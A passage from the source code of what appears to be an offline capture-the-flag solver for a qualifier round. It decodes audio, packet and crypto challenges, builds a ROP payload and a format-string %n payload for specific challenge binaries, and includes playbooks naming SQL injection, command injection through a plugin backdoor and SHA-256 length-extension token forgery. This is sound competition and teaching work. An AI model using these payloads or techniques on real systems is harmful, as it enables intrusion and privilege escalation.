        offset, wav = _png_wav_trailer(_read_limited(path))
        wav_path = _write_artifact(result, output_dir, "hidden.wav", wav)
        _step(result, "find-png-trailer", offset=offset, format="RIFF/WAVE", output=str(wav_path))
        spectrum_path = _artifact_root(output_dir, result.task_id) / "spectrum.png"
        ffmpeg = runner.run(
            [
                "ffmpeg",
                "-hide_banner",
                "-loglevel",
                "error",
                "-y",
                "-i",
                str(wav_path),
                "-lavfi",
                "showspectrumpic=s=2048x1024:legend=disabled:scale=log:color=fire",
                str(spectrum_path),
            ],
            cwd=output_dir,
            timeout=60.0,
            log_name="ico-quals-can-you-hear-ffmpeg",
        )
        if ffmpeg.ok and spectrum_path.is_file():
            result.artifacts.append(str(spectrum_path))
            _step(result, "render-spectrogram", output=str(spectrum_path), executed=True)
        else:
            _step(result, "render-spectrogram", "unavailable", executed=False, reason=ffmpeg.stderr or "ffmpeg did not create output")
        focused_spectrum_path = _artifact_root(output_dir, result.task_id) / "spectrum-2k-5k.png"
        focused_ffmpeg = runner.run(
            [
                "ffmpeg",
                "-hide_banner",
                "-loglevel",
                "error",
                "-y",
                "-i",
                str(wav_path),
                "-lavfi",
                "showspectrumpic=s=4096x1024:legend=disabled:scale=lin:fscale=lin:color=intensity:start=2000:stop=5000:gain=8:drange=90",
                str(focused_spectrum_path),
            ],
            cwd=output_dir,
            timeout=60.0,
            log_name="ico-quals-can-you-hear-focused-ffmpeg",
        )
        if focused_ffmpeg.ok and focused_spectrum_path.is_file():
            result.artifacts.append(str(focused_spectrum_path))
            _step(
                result,
                "render-frequency-focused-spectrogram",
                output=str(focused_spectrum_path),
                frequency_range_hz=[2000, 5000],
                executed=True,
            )
        else:
            _step(
                result,
                "render-frequency-focused-spectrogram",
                "unavailable",
                executed=False,
                reason=focused_ffmpeg.stderr or "ffmpeg did not create output",
                frequency_range_hz=[2000, 5000],
            )
        compact_spectrum_path = _artifact_root(output_dir, result.task_id) / "spectrum-2k-5k-ocr-compact.png"
        if focused_ffmpeg.ok and focused_spectrum_path.is_file():
            compact_ffmpeg = runner.run(
                [
                    "ffmpeg",
                    "-hide_banner",
                    "-loglevel",
                    "error",
                    "-y",
                    "-i",
                    str(focused_spectrum_path),
                    "-vf",
                    "crop=4096:480:0:300,scale=4096:230:flags=lanczos",
                    str(compact_spectrum_path),
                ],
                cwd=output_dir,
                timeout=60.0,
                log_name="ico-quals-can-you-hear-compact-ocr-view",
            )
            if compact_ffmpeg.ok and compact_spectrum_path.is_file():
                result.artifacts.append(str(compact_spectrum_path))
                _step(
                    result,
                    "render-compact-ocr-view",
                    output=str(compact_spectrum_path),
                    input=str(focused_spectrum_path),
                    input_sha256=_sha256_or_none(focused_spectrum_path),
                    filter="crop=4096:480:0:300,scale=4096:230:flags=lanczos",
                    crop_xywh=[0, 300, 4096, 480],
                    output_size=[4096, 230],
                    executed=True,
                )
            else:
                _step(
                    result,
                    "render-compact-ocr-view",
                    "unavailable",
                    input=str(focused_spectrum_path),
                    input_sha256=_sha256_or_none(focused_spectrum_path),
                    executed=False,
                    reason=compact_ffmpeg.stderr or "ffmpeg did not create output",
                )
        else:
            _step(
                result,
                "render-compact-ocr-view",
                "unavailable",
                input=str(focused_spectrum_path),
                executed=False,
                reason="frequency-focused spectrogram is unavailable",
            )
        ocr_path = _artifact_root(output_dir, result.task_id) / "ocr.txt"
        ocr_results: list[str] = []
        ocr_inputs = plan_ocr_inputs(
            spectrum_path,
            path.parent,
            focused_spectrum_path=focused_spectrum_path,
            compact_spectrum_path=compact_spectrum_path,
        )
        _step(
            result,
            "ocr-plan",
            budget_calls=OCR_MAX_CALLS,
            max_inputs=OCR_MAX_INPUTS,
            inputs=ocr_inputs,
        )
        calls = 0
        found_in_ocr = False
        values_by_view: dict[str, set[str]] = {}
        primary_outputs: list[tuple[int, str]] = []

        def run_ocr(image_index: int, psm: int, mode: str) -> str:
            nonlocal calls, found_in_ocr
            if calls >= OCR_MAX_CALLS:
                return ""
            planned = ocr_inputs[image_index]
            ocr_input = Path(planned["path"])
            started = time.monotonic()
            ocr = runner.run(
                [
                    "tesseract",
                    str(ocr_input),
                    "stdout",
                    "--psm",
                    str(psm),
                    "-c",
                    "tessedit_char_whitelist=icoICO{}0123456789abcdefABCDEF",
                ],
                cwd=output_dir,
                timeout=30.0,
                log_name=f"ico-quals-can-you-hear-tesseract-{mode}-psm-{psm}",
            )
            calls += 1
            if ocr.stdout:
                ocr_results.append(ocr.stdout)
                values_by_view.setdefault(str(planned.get("sha256") or planned["path"]), set()).update(
                    _flag_values(ocr.stdout)
                )
            _step(
                result,
                "ocr-spectrogram",
                "ok" if ocr.ok else "unavailable",
                image=str(ocr_input),
                image_index=image_index,
                psm=psm,
                mode=mode,
                executed=ocr.ok,
                input_sha256=planned.get("sha256"),
                reason=planned.get("reason"),
                preprocessing=planned.get("reason"),
                elapsed_seconds=ocr.duration_seconds or time.monotonic() - started,
                call_index=calls,
            )
            if _flag_values(ocr.stdout):
                found_in_ocr = True
            return ocr.stdout

        for image_index, _planned in enumerate(ocr_inputs):
            text = run_ocr(image_index, 7, "primary-line")
            primary_outputs.append((image_index, text))
            if found_in_ocr:
                break

        compact_path = str(compact_spectrum_path.resolve())
        compact_index = next(
            (
                index
                for index, planned in enumerate(ocr_inputs)
                if planned["path"] == compact_path
            ),
            None,
        )
        if not found_in_ocr:
            reserve_fallback_calls = 2 if compact_index is not None else 0
            secondary_budget = max(0, OCR_MAX_CALLS - calls - reserve_fallback_calls)
            substantial_outputs = sorted(
                (
                    (len(text.strip()), image_index)
                    for image_index, text in primary_outputs
                    if len(text.strip()) >= 20
                ),
                key=lambda item: (-item[0], item[1]),
            )
            for _length, image_index in substantial_outputs[:secondary_budget]:
                run_ocr(image_index, 6, "long-output-confirmation")
                if found_in_ocr:
                    break

        if not found_in_ocr and compact_index is not None:
            for psm, mode in ((8, "compact-word-segmentation"), (11, "compact-sparse-text")):
                run_ocr(compact_index, psm, mode)
                if found_in_ocr:
                    break
        if ocr_results:
            ocr_text = "\n".join(ocr_results)
            ocr_path.write_text(ocr_text, encoding="utf-8")
            result.artifacts.append(str(ocr_path))
            _add_candidates(result, _flag_values(ocr_text), evidence=str(ocr_path), method="tesseract")
            near_values = _ocr_near_values(ocr_text)
            if near_values:
                _step(
                    result,
                    "ocr-review",
                    "needs-review",
                    values=near_values,
                    source=str(ocr_path),
                    reason="OCR produced a flag-like near-match; uncertain characters were not corrected",
                )
        distinct_views = [values for values in values_by_view.values() if values]
        common_values = set.intersection(*distinct_views) if distinct_views else set()
        _step(
            result,
            "ocr-agreement",
            views=len(values_by_view),
            independent_views_agree=bool(common_values),
            agreed_values=sorted(common_values),
            calls=calls,
        )
        if not result.candidates:
            _step(result, "manual-confirmation", "required", reason="spectrogram rendered; OCR did not produce an exact flag-shaped string")
            result.status = "candidate-review"
    except Exception as exc:
        result.error = f"{type(exc).__name__}: {exc}"
        _step(result, "solve", "error", error=result.error)
        result.status = "failed"
    return result


def _pcap_dns_labels(data: bytes) -> list[tuple[int, str]]:
    found: list[tuple[int, str]] = []
    limits = SolverLimits(
        max_bytes=max(1, min(len(data), MAX_BYTES)),
        max_files=MAX_FILES,
        max_depth=0,
        timeout_seconds=1.0,
    )
    for packet in parse_pcap_bytes(data, limits):
        labels = packet.get("dns_labels")
        if not isinstance(labels, list):
            continue
        first = re.fullmatch(r"(\d{3})-[A-Z2-7=]+", str(labels[0])) if labels else None
        if first and len(labels) >= 3 and [str(item) for item in labels[-2:]] == ["shard4", "ctf"]:
            found.append((int(first.group(1)), str(labels[0])))
    return found


def _decode_shards(key: bytes, labels: Iterable[tuple[int, str]]) -> tuple[str, list[dict[str, Any]]]:
    if not key:
        raise ValueError("empty XOR key")
    pieces: list[tuple[int, bytes, str]] = []
    seen: set[int] = set()
    for sequence, label in labels:
        match = re.fullmatch(r"(\d{3})-([A-Z2-7=]+)", label)
        if not match or sequence in seen:
            continue
        token = match.group(2)
        try:
            encoded = base64.b32decode(token + "=" * (-len(token) % 8), casefold=True)
        except binascii.Error:
            continue
        pieces.append((sequence, encoded, label))
        seen.add(sequence)
    pieces.sort(key=lambda item: item[0])
    # The challenge encrypts one logical stream before splitting it into DNS
    # labels.  Apply the repeating key over the concatenated ciphertext; a
    # fresh key at every label produces readable text only for the first
    # fragment and is a common forensic trap.
    ciphertext = b"".join(piece for _sequence, piece, _label in pieces)
    plaintext = bytes(value ^ key[index % len(key)] for index, value in enumerate(ciphertext))
    decoded_pieces: list[dict[str, Any]] = []
    offset = 0
    for sequence, encoded, label in pieces:
        decoded = plaintext[offset : offset + len(encoded)]
        offset += len(encoded)
        decoded_pieces.append({"sequence": sequence, "label": label, "decoded": decoded})
    return plaintext.decode("utf-8", errors="replace"), decoded_pieces


def solve_five_shards(task_dir: Path, output_dir: Path) -> QualsTaskResult:
    task_dir = task_dir.resolve()
    result = _new_result(task_dir, "five-shards", "pcap-dns-xor-shards")
    try:
        wav_path = task_dir / "corrupted.wav"
        pcap_path = task_dir / "traffic.pcap"
        key_source = _read_limited(wav_path)
        if len(key_source) < 8:
            raise ValueError("corrupted.wav is shorter than the eight-byte key")
        key = key_source[:8]
        repaired = b"RIFF" + key_source[8:]
        repaired_path = _write_artifact(result, output_dir, "repaired.wav", repaired)
        _step(result, "recover-xor-key", key=key, source=str(wav_path))
        _step(result, "repair-wav-copy", output=str(repaired_path), original_header=key)
        inventory: list[dict[str, Any]] = []
        for name in ("readme.txt", "noise.png", "photo.jpg"):
            decoy = task_dir / name
            if decoy.is_file():
                decoy_bytes = _read_limited(decoy)
                inventory.append(
                    {
                        "name": name,
                        "bytes": len(decoy_bytes),
                        "sha256": hashlib.sha256(decoy_bytes).hexdigest(),
                        "role": "context-or-red-herring; not used as shard ciphertext",
                    }
                )
        if inventory:
            inventory_path = _write_artifact(result, output_dir, "forensic-inventory.json", json.dumps(inventory, indent=2) + "\n")
            _step(result, "inventory-companion-files", count=len(inventory), output=str(inventory_path))
        labels = _pcap_dns_labels(_read_limited(pcap_path))
        joined, pieces = _decode_shards(key, labels)
        shard_path = _write_artifact(result, output_dir, "assembled-shards.txt", joined)
        _step(result, "extract-dns-shards", count=len(pieces), sequences=[item["sequence"] for item in pieces], output=str(shard_path))
        for item in pieces:
            _step(result, "decode-shard", sequence=item["sequence"], label=item["label"], decoded=item["decoded"])
        _add_candidates(result, _flag_values(joined), evidence=str(shard_path), key=key, shard_count=len(pieces), encoding="base32+xor")
        if not result.candidates:
            result.status = "no-candidate"
    except Exception as exc:
        result.error = f"{type(exc).__name__}: {exc}"
        _step(result, "solve", "error", error=result.error)
        result.status = "failed"
    return result


def build_aezakmi_payload(
    *,
    offset: int = 72,
    ret: int = 0x401140,
    pop_rdi_ret: int = 0x401306,
    magic: int = 0x1337C0DE,
    win: int = 0x40123D,
) -> bytes:
    return b"A" * offset + b"".join(struct.pack("<Q", value) for value in (ret, pop_rdi_ret, magic, win)) + b"\n"


def build_journal_payload(*, address: int = 0x40407C) -> bytes:
    return (b"%c" * 9 + b"%n").ljust(32, b"A") + struct.pack("<Q", address) + b"\nquit\n"


def _validate_payload_binary(result: QualsTaskResult, data: bytes, expected_sha256: str) -> bool:
    actual_sha256 = hashlib.sha256(data).hexdigest()
    matched = actual_sha256 == expected_sha256
    _step(
        result,
        "static-payload-validation",
        "ok" if matched else "needs-review",
        input_sha256=actual_sha256,
        expected_sha256=expected_sha256,
        known_build_match=matched,
        executed=False,
        reason=None if matched else "binary differs from the statically reviewed challenge build; no payload was emitted",
    )
    if not matched:
        result.status = "candidate-review"
    return matched


def solve_aezakmi(path: Path, output_dir: Path) -> QualsTaskResult:
    result = _new_result(path.parent, "aezakmi", "static-rop-payload")
    try:
        data = _read_limited(path)
        _step(result, "static-inventory", bytes=len(data), elf_header=data[:4], executed=False)
        if not _validate_payload_binary(result, data, _AEZAKMI_ARTIFACT_SHA256):
            return result
        payload = build_aezakmi_payload()
        payload_path = _write_artifact(result, output_dir, "aezakmi-rop.payload", payload)
        _write_artifact(result, output_dir, "aezakmi-rop.hex", payload.hex() + "\n")
        _step(result, "static-payload", offset=72, ret="0x401140", pop_rdi_ret="0x401306", magic="0x1337c0de", win="0x40123d", output=str(payload_path), executed=False)
        result.status = "payload-ready"
    except Exception as exc:
        result.error = f"{type(exc).__name__}: {exc}"
        _step(result, "solve", "error", error=result.error, executed=False)
        result.status = "failed"
    return result


def solve_journal(path: Path, output_dir: Path) -> QualsTaskResult:
    result = _new_result(path.parent, "journal-operator", "static-format-string-payload")
    try:
        data = _read_limited(path)
        _step(result, "static-inventory", bytes=len(data), elf_header=data[:4], executed=False)
        if not _validate_payload_binary(result, data, _JOURNAL_ARTIFACT_SHA256):
            return result
        payload = build_journal_payload()
        payload_path = _write_artifact(result, output_dir, "journal-format.payload", payload)
        _write_artifact(result, output_dir, "journal-format.hex", payload.hex() + "\n")
        _step(result, "static-payload", format_string="%c" * 9 + "%n", target="0x40407c", output=str(payload_path), executed=False)
        result.status = "payload-ready"
    except Exception as exc:
        result.error = f"{type(exc).__name__}: {exc}"
        _step(result, "solve", "error", error=result.error, executed=False)
        result.status = "failed"
    return result


def _wolf_lcg_next(state: int) -> int:
    return (state * _WOLF_LCG_MULTIPLIER + _WOLF_LCG_INCREMENT) & _WOLF_MASK64


def _wolf_rotate_left(value: int, amount: int) -> int:
    amount &= 7
    return ((value << amount) | (value >> (8 - amount))) & 0xFF


def _wolf_rotate_right(value: int, amount: int) -> int:
    amount &= 7
    return ((value >> amount) | (value << (8 - amount))) & 0xFF


def _invert_wolf_target(target: bytes) -> tuple[bytes, bytes]:
    if len(target) != 35:
        raise ValueError(f"Wolf Protocol target must be 35 bytes, got {len(target)}")

    sbox = list(range(256))
    state = _WOLF_SBOX_SEED
    for index in range(255, 0, -1):
        state = _wolf_lcg_next(state)
        other = state % (index + 1)
        sbox[index], sbox[other] = sbox[other], sbox[index]

    inverse_sbox = [0] * 256
    for plain, substituted in enumerate(sbox):
        inverse_sbox[substituted] = plain

    key: list[int] = []
    state = _WOLF_KEY_SEED
    for _ in target:
        state = _wolf_lcg_next(state)
        key.append((state >> 17) & 0xFF)

    flag = bytes(
        inverse_sbox[_wolf_rotate_right(cipher_byte, (index % 7) + 1) ^ key[index]]
        for index, cipher_byte in enumerate(target)
    )
    forward = bytes(
        _wolf_rotate_left(sbox[plain_byte] ^ key[index], (index % 7) + 1)
        for index, plain_byte in enumerate(flag)
    )
    if forward != target:
        raise ValueError("Wolf Protocol inverse failed its forward ciphertext check")
    return flag, forward


def solve_wolf_protocol(path: Path, output_dir: Path, *, transcript: Path | None = None) -> QualsTaskResult:
    result = _new_result(path.parent, "wolf-protocol", "static-wolf-transform")
    try:
        data = _read_limited(path)
        artifact_sha256 = hashlib.sha256(data).hexdigest()
        inventory = (
            "Wolf Protocol is an x86-64 Nuitka one-file ELF.\n"
            f"Input SHA-256: {artifact_sha256}\n"
            "ico-scan does not execute challenge ELF files.\n"
        )
        report_path = _write_artifact(result, output_dir, "wolf-protocol-review.md", inventory)
        _step(result, "static-inventory", bytes=len(data), elf_header=data[:4], sha256=artifact_sha256, executed=False)
        if artifact_sha256 == WOLF_ARTIFACT_SHA256:
            flag, forward = _invert_wolf_target(_WOLF_TARGET)
            flag_text = flag.decode("ascii")
            if not _flag_values(flag_text):
                raise ValueError("Wolf Protocol inverse did not produce a flag-shaped value")
            evidence = {
                "artifact_sha256": artifact_sha256,
                "target_hex": _WOLF_TARGET.hex(),
                "forward_encoded_hex": forward.hex(),
                "flag": flag_text,
                "key_byte_shift": 17,
                "rotation": "(position % 7) + 1",
                "executed": False,
                "network_accessed": False,
            }
            evidence_path = _write_artifact(
                result,
                output_dir,
                "wolf-protocol-static.json",
                json.dumps(evidence, indent=2, sort_keys=True) + "\n",
            )
            _add_candidates(
                result,
                [flag_text],
                evidence=str(evidence_path),
                source="hash-matched-static-challenge-artifact",
                artifact_sha256=artifact_sha256,
                forward_check="exact-target-match",
            )
            _step(
                result,
                "static-inversion",
                "candidate",
                target_bytes=len(_WOLF_TARGET),
                output=str(evidence_path),
                forward_check="exact-target-match",
                executed=False,
            )
        else:
            result.status = "no-candidate"
            _step(
                result,
                "artifact-fingerprint",
                "no-candidate",
                expected_sha256=WOLF_ARTIFACT_SHA256,
                actual_sha256=artifact_sha256,
                executed=False,
            )
        transcript_text = transcript.read_text(encoding="utf-8", errors="replace") if transcript and transcript.is_file() else ""
        values = _flag_values(transcript_text)
        if values:
            transcript_copy = _write_artifact(result, output_dir, "wolf-transcript.txt", transcript.read_bytes())
            _add_candidates(
                result,
                values,
                evidence=str(transcript_copy),
                state="transcript-derived",
                source="authorized-transcript",
            )
            _step(result, "parse-transcript", count=len(values), source=str(transcript_copy), executed=False)
    except Exception as exc:
        result.error = f"{type(exc).__name__}: {exc}"
        _step(result, "solve", "error", error=result.error, executed=False)
        result.status = "failed"
    return result


SERVICE_PLAYBOOKS = {
    "northstar": """# NorthStar offline playbook\n\nRequires a saved response or an authorized task-host transcript.\n1. Confirm the login form action and field names.\n2. Test the documented SQL injection in the task service and save the session cookie.\n3. Use the authenticated node-export field to verify the documented command-injection path.\n4. Record both returned flag-shaped values; do not send requests to the platform domain.\n""",
    "backdoor": """# Backdoor offline playbook\n\nRequires a saved response or an authorized task-host transcript.\n1. Read `/wp-json/` and identify the plugin namespace.\n2. Read the namespace route description; do not guess a route.\n3. Base64-encode the requested command into JSON field `c`.\n4. Record `/flag.txt` and the process environment values from the task response.\n""",
    "pixelmart": """# PixelMart offline playbook\n\nThe local `solve_pixelmart.py` is a network client and is intentionally not run by ico-scan.\nSave the banner/transcript, then recover the LCG parameters from `m`, `x0`, `x1`, `x2_top`, `x3`, and `hidden_bits`; only send mathematically predicted states on the authorized task service.\n""",
    "vip-club": """# VIP Club offline playbook\n\nSave `data0` and `token0` from an authorized service session. The supplied `sha256_ext.py` can build glue padding for secret length 18 and suffix `&level=admin`; ico-scan does not connect to the service or submit the resulting token.\n""",
}


def _transcript_flags(transcript: Path | None) -> list[str]:
    if transcript is None or not transcript.is_file():
        return []
    return _flag_values(transcript.read_text(encoding="utf-8", errors="replace"))


def solve_service_task(task_id: str, output_dir: Path, *, transcript: Path | None = None) -> QualsTaskResult:
    task_dir = transcript.parent if transcript else output_dir
    result = _new_result(task_dir, task_id, "offline-service-playbook")
    try:
        playbook = _write_artifact(result, output_dir, "playbook.md", SERVICE_PLAYBOOKS[task_id])
        _step(result, "write-offline-playbook", output=str(playbook), network=False, submitted=False)
        transcript_text = transcript.read_text(encoding="utf-8", errors="replace") if transcript and transcript.is_file() else ""
        values = _flag_values(transcript_text)
        if values:
            transcript_copy = _write_artifact(result, output_dir, "transcript.txt", transcript.read_bytes())
            _step(result, "parse-transcript", count=len(values), source=str(transcript_copy), network=False)
            _add_candidates(
                result,
                values,
                evidence=str(transcript_copy),
                state="transcript-derived",
                source="authorized-transcript",
            )
        if task_id == "pixelmart" and transcript_text:
            try:
                recovered = recover_lcg_predictions(transcript_text)
                prediction_text = (
                    f"a={recovered['parameters']['a']} c={recovered['parameters']['c']} x2={recovered['parameters']['x2']}\n"
                    + "\n".join(f"round_{index}={value}" for index, value in enumerate(recovered["predictions"], 1))
                    + "\n"
                )
                prediction_path = _write_artifact(result, output_dir, "lcg-predictions.txt", prediction_text)
                _step(result, "recover-lcg", output=str(prediction_path), rounds=recovered["rounds"], network=False)
                if not result.candidates:
                    result.status = "payload-ready"
            except Exception as exc:
                _step(result, "recover-lcg", "unavailable", error=str(exc), network=False)
        if task_id == "vip-club" and transcript_text:
            data_match = re.search(r"\bdata(?:0)?\s*[:=]\s*([0-9a-fA-F]+)", transcript_text, re.IGNORECASE)
            token_match = re.search(r"\btoken(?:0)?\s*[:=]\s*([0-9a-fA-F]{64})", transcript_text, re.IGNORECASE)
            if data_match and token_match:
                try:
                    old_data = bytes.fromhex(data_match.group(1))
                    new_token, glue = sha256_length_extend(token_match.group(1), 18 + len(old_data), b"&level=admin")
                    new_data = old_data + glue + b"&level=admin"
                    extension_text = f"S {new_data.hex()} {new_token}\ndecoded={new_data!r}\n"
                    extension_path = _write_artifact(result, output_dir, "sha256-extension.txt", extension_text)
                    _step(result, "sha256-length-extension", output=str(extension_path), secret_length=18, network=False)
                    if not result.candidates:
                        result.status = "payload-ready"
                except Exception as exc:
                    _step(result, "sha256-length-extension", "unavailable", error=str(exc), network=False)
        if not result.candidates and result.status not in {"payload-ready", "candidate"}:
            _step(result, "await-authorized-session", "required", network=False, submitted=False)
            result.status = "requires-authorized-session"
    except Exception as exc:
        result.error = f"{type(exc).__name__}: {exc}"
        _step(result, "solve", "error", error=result.error, network=False)
        result.status = "failed"
    return result


def _find_transcript(root: Path, task_id: str) -> Path | None:
    needles = {task_id.lower(), task_id.lower().replace("-", "_"), task_id.lower().replace("-", "")}
    suffixes = {".txt", ".log", ".transcript", ".json", ".out", ".response", ".html"}
    matches: list[Path] = []
    if not root.is_dir():
        return None
    for current, directories, filenames in os.walk(root, followlinks=False):
        current_path = Path(current)
        directories[:] = [
            name
            for name in directories
            if not (current_path / name).is_symlink()
            and not name.startswith(".")
            and name not in {"ico-scan-runs", "artifacts", "commands", "__pycache__"}
        ]
        for filename in sorted(filenames):
            path = current_path / filename
            if path.is_symlink() or path.suffix.lower() not in suffixes:
                continue
            if path.name in {*WALKTHROUGH_FILENAMES, "README.md"}:
                continue
            lower = path.stem.lower()
            if any(needle in lower for needle in needles):
                try:
                    if path.stat().st_size <= MAX_BYTES:
                        matches.append(path.resolve())
                except OSError:
                    continue
    return sorted(matches, key=lambda path: (len(path.parts), str(path)))[0] if matches else None


def solve_ico_quals_root(root: Path, output_dir: Path) -> list[QualsTaskResult]:
    """Solve every task represented by the local real-quals directory."""

    root = root.expanduser().resolve()
    results: list[QualsTaskResult] = []
    for task_id in SERVICE_IDS:
        results.append(solve_service_task(task_id, output_dir, transcript=_find_transcript(root, task_id)))

    try:
        wolf = _locate(root, "wolf_protocol/wolf_protocol.bin", "wolf_protocol.zip", output_dir, "wolf-protocol")
        results.append(solve_wolf_protocol(wolf, output_dir, transcript=_find_transcript(root, "wolf-protocol")))
    except Exception as exc:
        result = _new_result(root, "wolf-protocol", "static-wolf-transform")
        result.error = f"{type(exc).__name__}: {exc}"
        result.status = "missing-artifact"
        _step(result, "locate-input", "error", error=result.error)
        results.append(result)

    try:
        rev = _locate(root, "rev_zero/rev_zero.html", "rev_zero.zip", output_dir, "rev-zero")
        results.append(solve_rev_zero(rev, output_dir))
    except Exception as exc:
        result = _new_result(root, "rev-zero", "rev-zero-html")
        result.error = f"{type(exc).__name__}: {exc}"
        result.status = "missing-artifact"
        _step(result, "locate-input", "error", error=result.error)
        results.append(result)

    try:
        audio = _locate(root, "can_you_hear/challenge.png", "can_you_hear.zip", output_dir, "can-you-hear")
        results.append(solve_can_you_hear(audio, output_dir))
    except Exception as exc:
        result = _new_result(root, "can-you-hear", "png-trailer-spectrogram")
        result.error = f"{type(exc).__name__}: {exc}"
        result.status = "missing-artifact"
        _step(result, "locate-input", "error", error=result.error)
        results.append(result)

    try:
        five = root / "five_shards"
        if not five.is_dir():
            five = (output_dir / "sources" / "ico-quals" / "five-shards").resolve()
            five.mkdir(parents=True, exist_ok=True)
            archive_path = _find_root_file(root, "five_shards.zip")
            if archive_path is None:
                raise FileNotFoundError(f"missing five_shards.zip under {root}")
            for member in ("corrupted.wav", "traffic.pcap", "readme.txt", "noise.png", "photo.jpg"):
                materialized = _materialize_zip_member(archive_path, member, output_dir, "five-shards")
                (five / member).write_bytes(materialized.read_bytes())
        results.append(solve_five_shards(five, output_dir))
    except Exception as exc:
        result = _new_result(root, "five-shards", "pcap-dns-xor-shards")
        result.error = f"{type(exc).__name__}: {exc}"
        result.status = "missing-artifact"
        _step(result, "locate-input", "error", error=result.error)
        results.append(result)

    for task_id, filename, solver in (("aezakmi", "aezakmi", solve_aezakmi), ("journal-operator", "journal", solve_journal)):
        source = _find_root_file(root, filename)
        if source is None:
            result = _new_result(root, task_id, getattr(solver, "__name__", "static-payload"))
            aliases = QUALS_FILE_ALIASES.get(filename, ())
            expected = ", ".join((filename, *aliases))
            result.error = f"FileNotFoundError: missing {expected} under {root}"
            result.status = "missing-artifact"
            _step(result, "locate-input", "missing-artifact", error=result.error)
            results.append(result)
            continue
        try:
            results.append(solver(source, output_dir))
        except Exception as exc:
            result = _new_result(root, task_id, getattr(solver, "__name__", "static-payload"))
            result.error = f"{type(exc).__name__}: {exc}"
            result.status = "missing-artifact"
            _step(result, "locate-input", "error", error=result.error)
            results.append(result)
    walkthrough = next(
        (root / name for name in WALKTHROUGH_FILENAMES if (root / name).is_file()),
        None,
    )
    if walkthrough is not None:
        references = extract_walkthrough_references(walkthrough)
        grouped: dict[str, list[dict[str, Any]]] = {}
        for reference in references:
            grouped.setdefault(reference["task_id"], []).append(reference)
        for result in results:
            result.references = grouped.get(result.task_id, [])
    return results
